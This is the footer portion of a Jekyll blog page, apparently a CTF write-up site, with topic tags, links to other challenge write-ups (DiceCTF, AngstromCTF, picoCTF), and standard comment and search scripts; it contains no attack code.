href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/noCookies/"><div class="card-body"> <em class="timeago small" data-ts="1649398020" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NoCookies - DiceCTF2022</h3><div class="text-muted small"><p> Link challenge https://instancer.mc.ax/no-cookies https://admin-bot.mc.ax/no-cookies Source code Download Sơ lược về trang web overview Sẽ có 2 chức năng: Register -&amp;gt; đăng kí account và ...</p></div></div></a></div><div class="card"> <a href="/posts/angstromctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651505100" > 2022-05-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AngstromCTF 2022</h3><div class="text-muted small"><p> My solution for some web challenges in this competition The Flash Use DOM breakpoints in Chrome devtools, right click on p tag and chose Break on -&amp;gt; subtree modifications then step over to get...</p></div></div></a></div><div class="card"> <a href="/posts/noted/"><div class="card-body"> <em class="timeago small" data-ts="1649084880" > 2022-04-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Noted - picoCTF2022</h3><div class="text-muted small"><p> Sơ lược về challenge Trang gồm có hai chức năng Login và Register overview1 Tiếp đó ta thể tạo note và gửi link để report. overview2 Phân tích Sau khi thử thì mình nhận thấy có lỗi xss ở đây C...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/phpPopChain/" class="btn btn-outline-primary" prompt="Older"><p>PHP POP Chain</p></a> <a href="/posts/angstromctf2022/" class="btn btn-outline-primary" prompt="Newer"><p>AngstromCTF 2022</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "to016/to016.github.io", "data-repo-id": "R_kgDOHGuNaQ", "data-category": "Comments", "data-category-id": "DIC_kwDOHGuNac4CPNhc", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
